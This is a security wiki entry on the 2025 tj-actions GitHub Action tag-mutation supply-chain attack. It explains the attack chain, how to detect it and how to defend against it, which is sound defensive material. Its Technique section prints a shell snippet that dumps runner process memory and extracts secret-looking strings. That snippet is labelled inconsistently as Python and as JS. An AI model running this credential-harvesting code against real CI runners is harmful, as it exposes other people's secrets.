---
title: tj-actions retroactive tag mutation (2025)
slug: tj-actions-tag-mutation
---

> **TL;DR:** In March 2025 attackers compromised the `tj-actions/changed-files` GitHub Action and force-pushed almost every existing version tag (v1…v45) to a malicious commit that dumped runner memory — leaking CI secrets to public workflow logs across ~23,000 repositories. CVE-2025-30066.

## What it is
`tj-actions/changed-files` is a widely used GitHub Action (>23k repos) that returns the list of files changed in a PR/push. On 2025-03-14 an attacker — later traced to a compromised maintainer PAT — force-updated dozens of version tags (`v1`, `v2`, …, `v45.0.7`) to point at a single malicious commit. That commit ran a Python script that called the Linux `memdump` primitive on the runner process, regexed out secret-looking strings (AWS keys, GitHub tokens, GCP keys, npm tokens), and printed them — double-base64-encoded — to the workflow log. Public repos rendered those logs publicly. The cascade was made worse because tj-actions itself depends on `reviewdog/action-setup`, which was the initial compromise vector (CVE-2025-30154).

## Preconditions / where it applies
- Victim workflow references `tj-actions/changed-files@vX` (any mutable tag) instead of a commit SHA.
- The workflow runs with secrets available in the runner process memory (anything `env:`, anything passed into a previous step, the `GITHUB_TOKEN`).
- Workflow runs on a GitHub-hosted runner (the attack technique is Linux memdump-based).

## Technique
**The attacker's chain:**

1. **Compromise upstream** — phish/steal a PAT belonging to a maintainer of `reviewdog/action-setup`. Push a malicious tag.
2. **Pivot to tj-actions** — the tj-actions repo's CI used `reviewdog/action-setup`; the malicious tag stole the tj-actions maintainer PAT during a build.
3. **Tag mutation** — using the stolen PAT, force-push every tj-actions version tag to point at a single new commit containing a malicious `dist/index.js`.
4. **Runner memory dump** — that JS executed:

```python
sudo cat /proc/$RUNNER_PID/maps | grep -E 'rw-p' | \
  awk '{print $1}' | tr - ' ' | while read s e; do
    sudo dd if=/proc/$RUNNER_PID/mem bs=1 skip=$((0x$s)) \
      count=$((0x$e-0x$s)) 2>/dev/null
  done | strings | grep -iE 'AWS|TOKEN|SECRET|KEY' | base64 | base64
```

5. **Exfil via log** — the base64×2 output went to stdout; GitHub stored it in the workflow log; for public repos the log was world-readable.

**What this teaches:** mutable refs (`@v1`, `@main`) are a single-attacker-controlled point. SHA pinning (`@a1b2c3d`) defeats retroactive tag mutation because the SHA pinpoints one immutable commit.

**Defender's IR for this incident:** grep workflow logs for the double-base64 pattern, rotate every secret used by every workflow that ran tj-actions between Mar 14 and Mar 15, and audit `dependabot`/PR diffs for ref bumps.

Compare: [[ci-cd-as-cloud-attack-surface]] for the broader pattern, [[gha-oidc-sub-claim-wildcards]] for OIDC misconfig sibling.

## Detection and defence
- **Pin every action by full commit SHA**, not by tag. Use `tj-actions/changed-files@a1b2c3d` and update via Dependabot which proposes new SHAs.
- Enable GitHub's "Allow specified actions and reusable workflows" allowlist; deny `tj-actions/*` and similar third-party tags.
- Use `permissions:` at job-level to scope `GITHUB_TOKEN` (read-only by default).
- Move secrets to OIDC federation so there's no static secret to leak; if it leaks, the AWS/GCP/Azure role is still constrained by audience.
- Detect: grep public workflow logs for `[A-Za-z0-9+/]{200,}={0,2}` (oversized base64 strings printed in unstructured form).
- Treat any force-push to a maintained Action's tag as P1.

## References
- [Unit 42 — tj-actions supply chain attack](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/) — incident analysis
- [StepSecurity — tj-actions advisory](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised) — first responder write-up
- [GitHub — Security hardening for Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions) — pinning guidance
